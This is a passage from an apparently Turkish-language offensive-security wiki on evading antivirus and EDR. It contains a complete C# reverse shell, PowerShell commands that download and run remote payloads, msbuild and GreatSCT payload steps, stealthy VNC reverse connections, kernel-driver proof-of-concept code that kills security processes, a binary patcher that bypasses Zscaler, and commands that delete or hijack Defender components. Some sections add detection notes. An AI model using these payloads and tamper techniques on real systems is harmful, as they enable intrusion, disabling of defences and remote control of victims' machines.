- _View-Only Password_ alanında bir parola belirleyin

Ardından, _**winvnc.exe**_ binary dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **kurbanın** içine taşıyın

#### **Ters bağlantı**

**Saldırgan**, ters bir **VNC bağlantısını** yakalamaya **hazır** olması için kendi **host'u** içinde `vncviewer.exe -listen 5900` binary dosyasını **çalıştırmalıdır**. Ardından, **kurbanın** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Gizliliği korumak için aşağıdakileri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın, aksi takdirde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- `winvnc`'i aynı dizinde `UltraVNC.ini` olmadan başlatmayın, aksi takdirde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın, aksi takdirde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT İçinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi **listener'ı `msfconsole -r file.rc` ile başlatın** ve **xml payload'ı** şu komutla **çalıştırın**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Mevcut Defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Şununla kullan:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# derleyicisini kullanarak

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanımı örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha fazlası

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Alanından AV/EDR'yi Öldürme

Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programından yararlandı. Araç, **kendi savunmasız ama *imzalı* driver'ını** beraberinde getirir ve bu driver'ı, Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için kötüye kullanır.<sup>[[12]](#references)</sup>

Önemli çıkarımlar
1. **İmzalı driver**: Diske bırakılan dosya `ServiceMouse.sys` olsa da binary, Antiy Labs'ın “System In-Depth Analysis Toolkit” aracındaki yasal olarak imzalanmış `AToolsKrnl64.sys` driver'ıdır. Driver geçerli bir Microsoft imzası taşıdığından Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Servis yükleme**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   İlk satır driver'ı bir **kernel service** olarak kaydeder, ikinci satır ise onu başlatarak `\\.\ServiceMouse` yolunu userland'den erişilebilir hâle getirir.
3. **Driver'ın sunduğu IOCTL'ler**
   | IOCTL kodu | Yetenek                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID ile rastgele bir process'i sonlandırma (Defender/EDR service'lerini kapatmak için kullanılır) |
   | `0x990000D0` | Diskteki rastgele bir dosyayı silme |
   | `0x990001D0` | Driver'ı unload etme ve service'i kaldırma |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Neden işe yarıyor**: BYOVD, user-mode korumalarını tamamen atlar; kernel’de çalışan kod, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *protected* process’leri açabilir, sonlandırabilir veya kernel nesnelerine müdahale edebilir.

Tespit / Azaltma
•  Microsoft’un güvenlik açığı bulunan driver block list’ini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows, `AToolsKrnl64.sys` dosyasını yüklemeyi reddeder.
•  Yeni *kernel* servislerinin oluşturulmasını izleyin ve world-writable bir dizinden yüklenen veya allow-list’te bulunmayan bir driver yüklendiğinde uyarı verin.
•  User-mode handle’larının özel device object’lere açılmasını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Disk Üzerindeki Binary’leri Patch’leyerek Zscaler Client Connector Posture Kontrollerini Atlatma

Zscaler **Client Connector**, device-posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC’ye güvenir. İki zayıf tasarım tercihi, tam bypass’ı mümkün kılar:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (sunucuya bir boolean gönderilir).
2. Internal RPC endpoint’leri yalnızca bağlanan executable’ın **Zscaler tarafından imzalandığını** doğrular (`WinVerifyTrust` aracılığıyla).<sup>[[11]](#references)</sup>

**Disk üzerindeki dört imzalı binary patch’lenerek** her iki mekanizma da etkisiz hâle getirilebilir:

| Binary | Patch’lenen orijinal mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her kontrol uyumlu kabul edilir |
| `ZSAService.exe` | `WinVerifyTrust` işlevine dolaylı çağrı | NOP-ed ⇒ herhangi bir process (imzasız olanlar bile) RPC pipe’larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tunnel üzerindeki integrity kontrolleri | Kısa devre edilir |

Minimal patcher örneği:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

After orijinal dosyaları değiştirdikten ve hizmet yığınını yeniden başlattıktan sonra:

* **Tüm** güvenlik duruşu kontrolleri **yeşil/uyumlu** görünür.
* İmzasız veya değiştirilmiş ikili dosyalar, adlandırılmış kanal RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş ana makine, Zscaler politikalarında tanımlanan iç ağa kısıtlamasız erişim elde eder.

Bu vaka çalışması, yalnızca istemci tarafındaki güven kararlarının ve basit imza kontrollerinin birkaç bayt yamasıyla nasıl aşılabileceğini gösteriyor.

## Microsoft Defender `BTR.sys` güvenilir işlevselliğinin kötüye kullanımı

Defender'ın **Boot-Time Removal** sürücüsü, klasik BYOVD'ye yararlı bir karşı örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü bulunmayan, Microsoft tarafından imzalanmış meşru bir düzeltme bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde edildikten sonra bir operatör, özel düzeltme işlemini taklit ederek amaçlanan Ring-0 dosya/kayıt defteri işlemlerini gerçekleştirebilir. Bu, **ilk erişim veya ayrıcalık yükseltme değil, ihlal sonrası AV/EDR etkisizleştirme ilkelidir** ve sürücü, dikkat çeken bir üçüncü taraf sürücüyü içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### Tek kullanımlık sürücünün hazırlanması

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer şekilde adlandırılmış bir kernel hizmeti kaydeder. `DriverEntry`, hizmetin `Args` değerini okur, belirtilen NTFS ADS'yi açar, eylem listesinin şifresini çözüp doğrular, geri bildirim yazar ve başarılı yürütmenin ardından `0xC0000056` (`STATUS_DELETE_PENDING`) döndürerek sürücünün bellekte kalmak yerine yükünün kaldırılmasını sağlar. Taklit edilmiş bir hizmetin aşağıdaki ayırt edici değerleri vardır.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` akışı, RC4 ile şifrelenmiş bir blob içerir. İncelenen derlemeler sabit 256 baytlık bir anahtar kullandığından şifreleme bir yetkilendirme sınırı oluşturmaz. Geçerli bir düz metin; 24 baytlık bir global başlık (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, başlık CRC’si ve payload’dan türetilen bir işlem kimliği), ardından null ile sonlandırılmış bir UTF-16 geri bildirim yolu ve istenen sayıda öğe içerir. Her öğe, eyleme özgü verilerin izlediği 16 baytlık bir başlığa (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sahiptir ve bu veriler **tam olarak dört NUL baytıyla** biter. Her başlık/veri bölgesi; `0xEDB88320` CRC-32 polinomu, `0xFFFFFFFF` başlangıç durumu ve **son XOR olmadan** (`~CRC32`) ayrı ayrı denetlenir; her bölge için CRC durumu sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen eylem kimlikleri, bu kernel primitive’lerini kullanıma sunar.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Öğe verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli dosyalar da dahil olmak üzere bir dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Bir dosyayı saldırganın seçtiği korumalı bir yola taşır; boş bir hedef, silme anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry anahtarını ve alt anahtarlarını siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry değerini siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry değeri oluşturur/günceller ve eksik anahtar yollarını oluşturur |

5 ve 6 numaralı eylemlerde, ağ üzerinden iletilen anahtar/değer ayıracı **art arda iki ters eğik çizgidir**; geleneksel biçimde yazılmış bir yol doğru şekilde bölünmez. Geri bildirim dosyası çoğunlukla isteği yansıtır, ancak her öğenin ilk dört veri baytı, sonuçtaki `NTSTATUS` değerine dönüşür. Başında flags alanı bulunmayan 1 ve 2 numaralı eylemlerde BTR, bu durum koduna yer açmak için yolu dört ayrılmış sondaki bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken önyükleme aralığı

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) zincirin tamamını uygular: `BTR.sys` dosyasını yerel Defender’dan çıkarır, `<random>.sys:changelist` ve bir geri bildirim akışı oluşturur, zincirlenmiş eylemleri serileştirir/sağlama toplamlarını hesaplar/şifreler, hizmet registry anahtarını doğrudan oluşturur ve ardından `-trigger now` için `NtLoadDriver` çağrısı yapar veya `-trigger boot` için sürücüyü sistem başlangıcında yüklenecek şekilde bırakır. Registry’yi doğrudan hazırlamak, normal SCM `CreateServiceW` yolunu atlar ve bu nedenle hizmet yükleme Event ID 7045 kaydının oluşmasına **neden olmaz**. Önyükleme tetiklemeli kalıntılar daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü BTR, depolama yığını ve `SystemRoot` bağlantısı hazır olmadan `DriverEntry` içinden dosya G/Ç işlemleri gerçekleştirir. `Start=1` ve yüksek öncelikli `Boot Bus Extender` grubu ise Phase 1'de çalışır: NTFS kullanılabilir durumdadır, ancak sistem başlangıcında çalışan birçok güvenlik sürücüsü ve kullanıcı modundaki EDR hizmeti henüz başlatılmamıştır. `WdFilter` gibi boot-start filtreleri zaten yüklenmiş olabilir; ancak BTR, bir sonraki başlangıçtan önce bu filtrelerin ikili dosyalarını veya hizmet yapılandırmalarını kaldırabilir ve SCM bunları başlatmadan önce hizmet yürütülebilir dosyalarını silebilir. BTR, boot-start değerlendirmesinden sonra çalıştığı ve geçerli bir Microsoft imzası taşıdığı için ELAM bu açığı kapatmaz.<sup>[[36]](#references)</sup>

Bir işlemde birden fazla eylem yürütülür. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Eylem 1'i başa ekler: BTR bu günlük dosyasını oluşturur, ardından kendi silme isteğini işleyerek sürücü kaldırılmadan önce dosyayı siler. Bu, geride kalan kanıtı azaltır. Geri bildirimin `<random>.sys:<random>.dat` içine yerleştirilmesi ise sürücünün ve her iki akışın birlikte kaldırılmasını sağlar.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca imzaya dayalı kurallar ve Microsoft'un güvenlik açığı bulunan sürücüler engelleme listesi, BTR'nin amaçlanan işlevlerinin kötüye kullanılmasını önlemez. Meşru Defender kaynak zincirini rastgele bir başlatıcıdan ayırırken şu davranışsal korelasyonları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR hazırlama işlemlerinin tamamında görülür. Aynı `.sys` dosyasına eklenmiş bir `.dat` ADS özellikle şüphelidir; çünkü meşru Defender geri bildirimi normalde `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altına yerleştirir.
- **System 7045 olmadan Sysmon 12/13:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` kayıt defteri anahtarının doğrudan oluşturulmasını, eşleşen bir SCM yükleme olayı yoksa ilişkilendirin.
- **Sysmon 6 -> 23:** Bilinen bir BTR sürücüsünün Defender dışı bir kaynak zincirinden yüklenmesini, ardından `System`/PID 4'e atfedilen dosya silme işlemleriyle; özellikle güvenlik ikili dosyalarının silinmesiyle ilişkilendirin.
- **Sysmon 11 -> 23:** `\SystemRoot\Temp\BootClean.log` dosyasının `System`/PID 4 tarafından kısa süre içinde oluşturulup silinmesi için uyarı oluşturun.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; `cmd.exe`, PowerShell veya bilinmeyen bir süreç güvenlik aracı sürücüsünü hazırladığında yalnızca Microsoft imzasına güvenmek yeterli değildir.

## Protected Process Light (PPL) Kullanarak LOLBIN'lerle AV/EDR'yi Kurcalama

Protected Process Light (PPL), birbirlerinin işlemlerini kurcalayabilecek korumalı süreçleri eşit veya daha yüksek bir imza/koruma düzeyiyle sınırlar. Saldırgan açısından, PPL etkin bir ikili dosyayı meşru şekilde başlatabiliyor ve bağımsız değişkenlerini denetleyebiliyorsanız, günlük kaydı gibi zararsız bir işlevi AV/EDR tarafından kullanılan korumalı dizinlere yazma sağlayan, PPL destekli ve kısıtlı bir primitive'e dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir sürecin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen tüm DLL'ler), PPL destekleyen bir EKU ile imzalanmış olmalıdır.
- Süreç, şu işaretlerle `CreateProcess` kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- İkili dosyanın imzalayanıyla eşleşen uyumlu bir koruma düzeyi istenmelidir (ör. kötü amaçlı yazılımdan koruma imzalayanları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayanları için `PROTECTION_LEVEL_WINDOWS`). Yanlış düzeyler, oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS korumasına genel bir giriş için ayrıca şuraya bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Başlatıcı araçları
- Açık kaynaklı yardımcı araç: CreateProcessAsPPL (koruma düzeyini seçer ve bağımsız değişkenleri hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım örüntüsü:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikilisi `C:\Windows\System32\ClipUp.exe` kendi alt sürecini başlatır ve çağıranın belirttiği bir yola log dosyası yazmak için parametre kabul eder.
- PPL süreci olarak başlatıldığında dosya yazma işlemi PPL korumasıyla gerçekleşir.
- ClipUp, boşluk içeren yolları ayrıştıramaz; normalde korunan konumları belirtmek için 8.3 kısa yollarını kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listeleyin: Her üst dizinde `dir /x` komutunu çalıştırın.
- cmd içinde kısa yol türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse zinciri (soyut)
1) Bir başlatıcı (ör. CreateProcessAsPPL) kullanarak PPL destekli LOLBIN'i (ClipUp) `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korumalı bir AV dizininde (ör. Defender Platform) dosya oluşturulmasını sağlamak için ClipUp log yolu argümanını verin. Gerekirse 8.3 kısa adlarını kullanın.
3) Hedef ikili, çalışırken AV tarafından normalde açık veya kilitli tutuluyorsa (ör. MsMpEng.exe), yazma işlemini AV başlamadan önce, önyükleme sırasında gerçekleştirmek üzere daha önce güvenilir biçimde çalışan bir otomatik başlatma hizmeti kurun. Önyükleme sırasını Process Monitor (önyükleme günlüğü) ile doğrulayın.
4) Yeniden başlatmada PPL destekli yazma işlemi, AV ikililerini kilitlemeden önce gerçekleşir; böylece hedef dosya bozulur ve AV'nin başlatılması engellenir.

Örnek çalıştırma (güvenlik için yollar gizlendi/kısaltıldı):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği, yalnızca nereye yazacağını belirleyerek kontrol edemezsiniz; bu yöntem hassas içerik enjeksiyonundan ziyade bozulmaya uygundur.
- Hizmet yüklemek/başlatmak için yerel yönetici/SYSTEM yetkisi ve yeniden başlatma fırsatı gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; başlangıçta çalıştırma dosya kilitlerini önler.

Tespit
- Özellikle standart dışı başlatıcıların alt süreci olarak, başlangıç civarında olağandışı argümanlarla oluşturulan `ClipUp.exe` süreçleri.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılmış ve sürekli olarak Defender/AV'den önce başlatılan yeni hizmetler. Defender başlangıç hatalarından önceki hizmet oluşturma/değiştirme işlemlerini araştırın.
- Defender ikili dosyaları/Platform dizinleri için dosya bütünlüğü izleme; korumalı süreç bayraklarıyla çalışan süreçlerin beklenmedik dosya oluşturma/değiştirme işlemleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV dışı ikili dosyaların anormal PPL düzeyi kullanımını araştırın.

Azaltma
- WDAC/Code Integrity: PPL olarak çalışabilecek imzalı ikili dosyaları ve hangi üst süreçlerin bunları başlatabileceğini kısıtlayın; ClipUp'ın meşru bağlamlar dışında çalıştırılmasını engelleyin.
- Hizmet güvenliği: Otomatik başlatılan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender kurcalama korumasının ve erken başlatma korumalarının etkin olduğundan emin olun; ikili dosya bozulmasına işaret eden başlangıç hatalarını araştırın.
- Ortamınızla uyumluysa güvenlik araçlarının bulunduğu birimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı değerlendirin (iyice test edin).

## Platform Sürüm Klasörü Symlink Ele Geçirmesiyle Microsoft Defender'ı Kurcalama

Windows Defender, çalışacağı platformu şu dizinin alt klasörlerini numaralandırarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek leksikografik sürüm dizesine sahip alt klasörü seçer (ör. `4.18.25070.5-0`), ardından Defender hizmet süreçlerini bu klasörden başlatır (hizmet/kayıt defteri yollarını buna göre günceller). Bu seçim, dizin symlink'leri de dahil olmak üzere dizin girdilerine güvenir. Bir yönetici, Defender'ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi sağlamak için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Önkoşullar
- Yerel yönetici (Platform klasörünün altında dizin/symlink oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (başlangıçta hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (`mklink`)

İşe yaramasının nedeni
- Defender kendi klasörlerine yazılmasını engeller; ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan leksikografik olarak en yüksek sürümü seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir kopyasını hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden, daha yüksek sürüm numarasına sahip bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni process yolunu `C:\TMP\AV\` altında ve service yapılandırması/registry'de bu konumu gösterecek şekilde görmelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender'ın process'lerinde kod çalıştırmak için Defender'ın uygulama dizininden yüklediği DLL'leri bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Sürüm symlink'ini kaldırın; böylece bir sonraki başlatmada yapılandırılan yol çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Bu tekniğin tek başına ayrıcalık yükseltme sağlamadığını, yönetici hakları gerektirdiğini unutmayın.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

